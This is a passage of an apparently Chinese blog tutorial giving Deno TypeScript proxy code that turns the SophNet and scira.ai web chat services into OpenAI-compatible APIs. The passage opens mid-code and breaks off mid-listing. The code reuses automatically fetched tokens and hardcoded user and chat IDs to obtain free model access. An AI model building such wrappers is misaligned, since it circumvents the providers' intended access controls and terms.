sophNetResponse.<span class="property">choices</span>[<span class="number">0</span>].<span class="property">message</span>.<span class="property">refs</span>) &#123;</span><br><span class="line">      references.<span class="title function_">push</span>(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为每个引用添加上标标记</span></span><br><span class="line">    references.<span class="title function_">forEach</span>(<span class="function">(<span class="params">ref, index</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> refIndex = index + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">const</span> superscriptIndex = <span class="string">`⁽<span class="subst">$&#123;convertToSuperscript(refIndex)&#125;</span>⁾`</span>;</span><br><span class="line">      <span class="comment">// 在内容末尾添加引用标记</span></span><br><span class="line">      content += <span class="string">` [<span class="subst">$&#123;superscriptIndex&#125;</span>](<span class="subst">$&#123;ref.url&#125;</span>)`</span>;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加参考资料部分</span></span><br><span class="line">    <span class="keyword">if</span> (references.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      content += <span class="string">&quot;\n\n&quot;</span> + <span class="title function_">generateReferencesSection</span>(references);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">id</span>: sophNetResponse.<span class="property">id</span> || <span class="string">`chatcmpl-<span class="subst">$&#123;<span class="built_in">Date</span>.now()&#125;</span>`</span>, <span class="comment">// 使用SophNet ID或生成新ID</span></span><br><span class="line">    <span class="attr">object</span>: <span class="string">&quot;chat.completion&quot;</span>,</span><br><span class="line">    <span class="attr">created</span>: <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>),</span><br><span class="line">    <span class="attr">model</span>: sophNetResponse.<span class="property">model</span> || <span class="string">&quot;sophnet-model&quot;</span>, <span class="comment">// 使用SophNet模型名或固定</span></span><br><span class="line">    <span class="attr">choices</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">index</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">message</span>: &#123;</span><br><span class="line">          <span class="attr">role</span>: <span class="string">&quot;assistant&quot;</span>,</span><br><span class="line">          <span class="attr">reasoning_content</span>: sophNetResponse.<span class="property">choices</span>?.[<span class="number">0</span>]?.<span class="property">message</span>?.<span class="property">reasoning_content</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="attr">content</span>: content,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">finish_reason</span>: sophNetResponse.<span class="property">choices</span>?.[<span class="number">0</span>]?.<span class="property">finish_reason</span> || <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">usage</span>: sophNetResponse.<span class="property">usage</span> || &#123;</span><br><span class="line">      <span class="attr">prompt_tokens</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">completion_tokens</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">total_tokens</span>: <span class="number">0</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主处理函数</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">handler</span>(<span class="params"><span class="attr">req</span>: <span class="title class_">Request</span></span>): <span class="title class_">Promise</span>&lt;<span class="title class_">Response</span>&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(req.<span class="property">url</span>);</span><br><span class="line">  <span class="keyword">const</span> path = url.<span class="property">pathname</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// CORS预检请求处理</span></span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;OPTIONS&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">      <span class="attr">status</span>: <span class="number">204</span>,</span><br><span class="line">      <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Access-Control-Allow-Methods&quot;</span>: <span class="string">&quot;GET, POST, OPTIONS&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Access-Control-Allow-Headers&quot;</span>: <span class="string">&quot;Content-Type, Authorization&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Access-Control-Max-Age&quot;</span>: <span class="string">&quot;86400&quot;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取有效token</span></span><br><span class="line">  <span class="keyword">let</span> token;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    token = <span class="keyword">await</span> <span class="title function_">getValidToken</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Failed to get token in handler:&quot;</span>, error);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Failed to get token&quot;</span>, <span class="attr">details</span>: error.<span class="property">message</span> &#125;),</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">status</span>: <span class="number">500</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 模型列表接口</span></span><br><span class="line">    <span class="keyword">if</span> (path === <span class="string">&quot;/v1/models&quot;</span> &amp;&amp; req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> models = <span class="keyword">await</span> <span class="title function_">getModels</span>(token);</span><br><span class="line">      <span class="keyword">const</span> openAIModels = <span class="title function_">transformModelsToOpenAIFormat</span>(models);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(openAIModels), &#123;</span><br><span class="line">        <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 聊天完成接口</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (path === <span class="string">&quot;/v1/chat/completions&quot;</span> &amp;&amp; req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> requestBody = <span class="keyword">await</span> req.<span class="title function_">json</span>();</span><br><span class="line">      <span class="keyword">const</span> stream = requestBody.<span class="property">stream</span> === <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> sophNetResponse = <span class="keyword">await</span> <span class="title function_">handleChatCompletions</span>(token, requestBody, stream);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (stream) &#123;</span><br><span class="line">        <span class="keyword">const</span> transformedStream = <span class="keyword">new</span> <span class="title class_">ReadableStream</span>(&#123;</span><br><span class="line">          <span class="keyword">async</span> <span class="title function_">start</span>(<span class="params">controller</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              <span class="keyword">for</span> <span class="title function_">await</span> (<span class="keyword">const</span> chunk <span class="keyword">of</span> <span class="title function_">transformStreamResponse</span>(sophNetResponse.<span class="property">body</span>!)) &#123;</span><br><span class="line">                controller.<span class="title function_">enqueue</span>(<span class="keyword">new</span> <span class="title class_">TextEncoder</span>().<span class="title function_">encode</span>(chunk));</span><br><span class="line">              &#125;</span><br><span class="line">              controller.<span class="title function_">close</span>();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Stream transformation error:&quot;</span>, error);</span><br><span class="line">              <span class="comment">// 在流中发送错误信息</span></span><br><span class="line">              <span class="keyword">const</span> errorData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">                <span class="attr">error</span>: &#123;</span><br><span class="line">                  <span class="attr">message</span>: <span class="string">`Stream processing error: <span class="subst">$&#123;error.message&#125;</span>`</span>,</span><br><span class="line">                  <span class="attr">type</span>: <span class="string">&quot;stream_error&quot;</span>,</span><br><span class="line">                  <span class="attr">code</span>: <span class="literal">null</span>,</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;);</span><br><span class="line">              controller.<span class="title function_">enqueue</span>(<span class="keyword">new</span> <span class="title class_">TextEncoder</span>().<span class="title function_">encode</span>(<span class="string">`data: <span class="subst">$&#123;errorData&#125;</span>\n\n`</span>));</span><br><span class="line">              controller.<span class="title function_">enqueue</span>(<span class="keyword">new</span> <span class="title class_">TextEncoder</span>().<span class="title function_">encode</span>(<span class="string">&quot;data: [DONE]\n\n&quot;</span>));</span><br><span class="line">              controller.<span class="title function_">close</span>();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(transformedStream, &#123;</span><br><span class="line">          <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/event-stream&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> transformedResponse = <span class="keyword">await</span> <span class="title function_">transformNonStreamResponse</span>(sophNetResponse);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(transformedResponse), &#123;</span><br><span class="line">          <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">          <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 未找到路由</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">error</span>: <span class="string">&quot;Not found&quot;</span>, <span class="attr">message</span>: <span class="string">&quot;Endpoint not supported&quot;</span> &#125;),</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">status</span>: <span class="number">404</span>,</span><br><span class="line">          <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Request handling error:&quot;</span>, error);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回统一的错误响应格式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">error</span>: &#123;</span><br><span class="line">          <span class="attr">message</span>: error.<span class="property">message</span>,</span><br><span class="line">          <span class="attr">type</span>: <span class="string">&quot;api_error&quot;</span>, <span class="comment">// 或者更具体的错误类型</span></span><br><span class="line">          <span class="attr">code</span>: error.<span class="property">status</span> || <span class="literal">null</span>, <span class="comment">// 如果是HTTP错误，包含状态码</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;),</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">status</span>: error.<span class="property">status</span> || <span class="number">500</span>, <span class="comment">// 使用错误状态码或默认500</span></span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Access-Control-Allow-Origin&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动服务器</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Starting server on port <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br><span class="line"><span class="title function_">serve</span>(handler, &#123; <span class="attr">port</span>: <span class="variable constant_">PORT</span> &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></details>  <p><img src= "" data-lazy-src="https://img.skyk.us.kg/file/1746880256687_2api1.png" alt="2api1.png"></p><p>图中 <strong>projectuuid</strong> 即为需要的数据。</p><h3 id="2、调用"><a href="#2、调用" class="headerlink" title="2、调用"></a>2、调用</h3><p>1、此时我们打开deno分配的链接，<br><img src= "" data-lazy-src="https://img.skyk.us.kg/file/1746880764163_2api2.png" alt="2api2.png"><br>返回json说明部署成功。<br>2、通过使用OpenWebui，NextChat，酒馆等api调用项目<br><img src= "" data-lazy-src="https://img.skyk.us.kg/file/1746880976455_2api3.png" alt="2api3.png"><br>可以看到刷出50多个模型实现ai自由。<br><img src= "" data-lazy-src="https://img.skyk.us.kg/file/1746881102952_2api4.png" alt="2api4.png"><br>-search为联网搜索版本，这里使用的是最新的千问3。</p><h1 id="二、scira2api"><a href="#二、scira2api" class="headerlink" title="二、scira2api"></a>二、scira2api</h1><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td><strong>源</strong></td><td><a href="https://mcp.scira.ai/">https://mcp.scira.ai/</a></td></tr><tr><td><strong>正在维护</strong></td><td>✅</td></tr><tr><td><strong>当前版本</strong></td><td>0.1.0 Alpha</td></tr><tr><td><strong>Demo</strong></td><td><a href="https://lazy-bear-13.deno.dev/">https://lazy-bear-13.deno.dev</a></td></tr><tr><td><strong>语言</strong></td><td>TypeScript</td></tr><tr><td><strong>框架</strong></td><td>Deno</td></tr></tbody></table><h2 id="Models-1"><a href="#Models-1" class="headerlink" title="Models"></a>Models</h2><ul><li>Claude 3.7 Sonnet</li><li>Gemini 2.5 Flash</li><li>GPT 4.1 Mini</li><li>Qwen QwQ</li></ul><h2 id="Features-1"><a href="#Features-1" class="headerlink" title="Features"></a>Features</h2><ul><li>&#x2F;v1 下的 OpenAI 兼容 API, 支持聊天补全与模型获取.</li></ul><h3 id="1、部署-1"><a href="#1、部署-1" class="headerlink" title="1、部署"></a>1、部署</h3><p>前往<a href="https://dash.deno.com/account/overview">Deno</a>创建XXX.ts</p><details><summary>scira2api.ts</summary><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; serve &#125; <span class="keyword">from</span> <span class="string">&quot;https://deno.land/std@0.220.1/http/server.ts&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义常量 搜索https://mcp.scira.ai/api/chat获取变量</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">API_URL</span> = <span class="string">&quot;https://mcp.scira.ai/api/chat&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FIXED_USER_ID</span> = <span class="string">&quot;siufoijroijoifjdhdhd&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FIXED_CHAT_ID</span> = <span class="string">&quot;Yin5ax00WN24iuR5ASl1f&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DEFAULT_MODEL</span> = <span class="string">&quot;claude-3-7-sonnet&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8888</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">  <span class="attr">role</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">content</span>: <span class="built_in">string</span>;</span><br><span class="line">  parts?: <span class="title class_">Array</span>&lt;&#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">text</span>: <span class="built_in">string</span>;</span><br><span class="line">  &#125;&gt;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">SciraPayload</span> &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">messages</span>: <span class="title class_">Message</span>[];</span><br><span class="line">  <span class="attr">selectedModel</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">mcpServers</span>: <span class="built_in">any</span>[];</span><br><span class="line">  <span class="attr">chatId</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">userId</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">OpenAIModel</span> &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">created</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">object</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可用模型列表</span></span><br><span class="line"><span class="keyword">const</span> <span class="attr">AVAILABLE_MODELS</span>: <span class="title class_">OpenAIModel</span>[] = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="string">&quot;qwen-qwq&quot;</span>,</span><br><span class="line">    <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">    <span class="attr">object</span>: <span class="string">&quot;model&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="string">&quot;gemini-2.5-flash&quot;</span>,</span><br><span class="line">    <span class="attr">created</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>(),</span><br><span class="line">    <span class="attr">object</span>: <span class="string">&quot;model&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span 